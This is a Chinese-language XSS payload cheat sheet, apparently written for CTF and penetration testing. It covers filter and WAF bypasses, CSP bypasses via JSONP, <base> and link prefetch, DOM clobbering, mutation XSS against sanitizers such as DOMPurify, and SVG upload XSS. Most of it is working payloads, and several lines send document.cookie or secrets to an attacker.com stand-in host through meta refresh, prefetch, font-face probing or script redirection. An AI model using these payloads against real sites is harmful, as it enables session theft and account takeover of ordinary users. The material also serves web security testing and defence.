# XSS WAF/过滤绕过 + CSP 绕过

## 标签被过滤
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

## 事件处理器替代
```html
onfocus autofocus
onmouseover
onanimationend style="animation-name:x"
onpointerover
```

## alert 被过滤
```javascript
confirm(1)
prompt(1)
print()
window['al'+'ert'](1)
top['al'+'ert'](1)
eval(atob('YWxlcnQoMSk='))
```

## 括号 `()` 被过滤
```html
<img src=x onerror=alert`1`>
<img src=x onerror="window.onerror=alert;throw 1">
```

## 大小写和编码绕过
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

## 空格被过滤
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

## 双写绕过（后端删除关键字）
```html
<scrscriptipt>alert(1)</scrscriptipt>
<img src=x ononerrorerror=alert(1)>
```

---

# CSP 绕过

检查响应头 `Content-Security-Policy`:
- `script-src 'unsafe-inline'` → 直接 `<script>alert(1)</script>`
- `script-src 'nonce-xxx'` → 找到页面中已有的 nonce 值
- `script-src *.google.com` → 利用 Google JSONP: `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">`
- 无 CSP → 直接注入
- `script-src 'self'` → 需要上传 JS 文件或找到同源 JSONP 端点

---

# 存储型 XSS

优先测试位置：
1. 评论/留言板 → 提交后查看是否保留 payload
2. 用户资料（用户名、签名、地址）
3. 文件名（上传文件时的文件名可能被显示）
4. 管理后台日志（User-Agent / Referer 注入）

**陷阱**：存储型 XSS 的输入和输出可能在不同页面。

---

# DOM XSS

**Source（用户可控）：**
- `document.URL`, `location.hash`, `location.search`
- `document.referrer`, `window.name`
- `postMessage`, `localStorage`

**Sink（危险操作）：**
- `innerHTML`, `outerHTML`, `document.write()`
- `eval()`, `setTimeout()`, `setInterval()`
- `location.href`, `window.open()`

DOM XSS 不经过服务端，需要分析前端 JS 代码。

---

# CSP 绕过进阶

## CSP 分析方法

```bash
# 获取 CSP 头
curl -sI http://target/ | grep -i content-security-policy
```

| CSP 配置 | 绕过方法 |
|----------|----------|
| `script-src 'unsafe-inline'` | 直接 `<script>alert(1)</script>` |
| `script-src 'nonce-xxx'` | 页面中找已有 nonce，或 DOM 注入 |
| `script-src 'self'` | 上传 JS 文件到同源 / 找同源 JSONP |
| `script-src *.cdn.com` | CDN 上找可控 JS（Angular/jQuery callback） |
| `script-src 'strict-dynamic'` | 借助页面已有可信 script 创建新 script |
| `default-src 'none'` + 无 `base-uri` | `<base href="http://attacker/">` 劫持相对路径 |
| 无 CSP 头 | 直接注入 |

## JSONP 端点利用

```html
<!-- 利用 Google JSONP -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- 利用 CDN 上的 Angular -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

## 利用 `<base>` 标签

如果 CSP 没有 `base-uri` 限制：
```html
<base href="http://attacker.com/">
<!-- 页面中所有相对路径的 script src 都会从 attacker.com 加载 -->
```

## meta 标签 redirect

```html
<meta http-equiv="refresh" content="0;url=http://attacker.com/?c=document.cookie">
```

## 利用 `<link>` 预加载外带数据

```html
<link rel=prefetch href="http://attacker.com/?c=SECRET_DATA">
<link rel=dns-prefetch href="SECRET.attacker.com">
```

---

# DOM Clobbering

**原理**：HTML 元素的 `id` 和 `name` 属性会创建全局变量，可以覆盖 JS 中未声明的变量。

### 基础覆盖

```html
<!-- JS 代码中有 if (config) { ... } 但 config 未定义 -->
<a id="config" href="javascript:alert(1)">

<!-- 覆盖嵌套属性 -->
<form id="config"><input name="url" value="http://attacker.com"></form>
<!-- 现在 config.url === "http://attacker.com" -->
```

### 覆盖 toString

```html
<!-- 当 JS 做 element.toString() 或字符串拼接时 -->
<a id="config" href="javascript:alert(1)">
<!-- config.toString() === "javascript:alert(1)" -->
```

### 覆盖多级属性

```html
<form id="x"><output id="y">clobbered</output></form>
<!-- x.y.textContent === "clobbered" -->
```

### 实际场景

```javascript
// 如果页面 JS 中有：
var url = window.config || '/default';
fetch(url).then(...)

// 注入：
<a id="config" href="http://attacker.com/evil.js">
// 现在 window.config 指向攻击者 URL
```

---

# mXSS (Mutation XSS)

**原理**：浏览器 DOM 解析器在将 HTML 字符串反序列化为 DOM 再序列化回 HTML 时，可能改变内容结构。如果消毒器（sanitizer）在序列化前检查，但浏览器实际渲染的是变异后的版本，就可以绕过。

### DOMPurify 绕过（历史漏洞示例）

```html
<!-- 原始 payload（看起来无害） -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- DOM 解析器会将 <table> 移出 <mtext> 命名空间 -->
<!-- 导致 <style> 的注释未闭合规则变化 -->
<!-- 最终 <img onerror> 变为可执行 -->
```

### mXSS 常见触发条件

```html
<!-- 命名空间混淆（SVG/MathML + HTML） -->
<svg><foreignObject><div><style>&lt;/style&gt;<img src=x onerror=alert(1)></style></div></foreignObject></svg>

<!-- 嵌套 <template> 标签 -->
<template><div><style></template><img src=x onerror=alert(1)>
```

### 识别 mXSS 机会

- 目标使用 DOMPurify/html-sanitizer 等客户端消毒
- 存在 innerHTML 赋值
- 涉及 SVG/MathML 命名空间

---

# SVG XSS

SVG 图片在浏览器中可以执行 JavaScript。

### 上传 SVG 文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <circle r="50"/>
</svg>
```

### SVG + script 标签

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

### SVG + foreignObject（嵌入 HTML）

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src=x onerror="alert(1)"/>
    </body>
  </foreignObject>
</svg>
```

### SVG + animate（事件触发）

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
</svg>
```

### SVG + use（SSRF/外部引用）

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <use href="http://attacker.com/evil.svg#payload"/>
</svg>
```

### 实际利用场景

1. **文件上传**：上传 .svg 头像/图片 → 其他用户查看时触发 XSS
2. **Markdown 渲染**：`![img](data:image/svg+xml;base64,PHN2...)` 注入
3. **邮件内容**：SVG 附件在 Webmail 中渲染时执行
4. **img 标签引用**：`<img src="uploaded.svg">` 在同源下会执行 JS（`<embed>` / `<object>` / `<iframe>` 也可以）

**注意**：`<img src="x.svg">` 标签加载 SVG 时**不会执行 JS**（浏览器安全限制），必须通过 `<embed>`、`<object>`、`<iframe>` 或直接访问 SVG URL 才能触发。

---

## CTF 高级绕过技巧补充

### Unicode 大小写折叠绕过
服务端用 ASCII 正则过滤 `<script>`，但后续处理层做 Unicode 大小写折叠（如 Go `strings.EqualFold`），`ſ` (U+017F) 被折叠为 `s`：
```html
<ſcript>location='https://attacker.com/?c='+document.cookie</ſcript>
```

### CSP base 标签劫持
CSP 有 `script-src 'nonce-xxx'` 但缺少 `base-uri` 指令时，注入 `<base>` 重定向带 nonce 的相对路径脚本：
```html
<base href="https://attacker.com/">
<!-- 页面中已有的 <script nonce="xxx" src="/app.js"> 会从 attacker.com/app.js 加载 -->
```

### CSP link prefetch 外泄
`<link rel="prefetch">` 不受 `script-src` 限制，配合 `<meta refresh>` 实现无 JS 数据外泄：
```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal">
```

### CSS @font-face unicode-range 字符探测
每个字符定义独立 `@font-face`，浏览器仅在目标元素包含该字符时发起字体请求：
```css
@font-face { font-family: x; src: url('http://attacker.com/?c=a'); unicode-range: U+0061; }
@font-face { font-family: x; src: url('http://attacker.com/?c=f'); unicode-range: U+0066; }
.target { font-family: x; }
```

### postMessage null origin 绕过
`data:` URI iframe 的 `origin` 为 `null`，可绕过 `event.origin === 'null'` 检查：
```html
<iframe src="data:text/html,<script>parent.postMessage('payload','*')</script>">
```
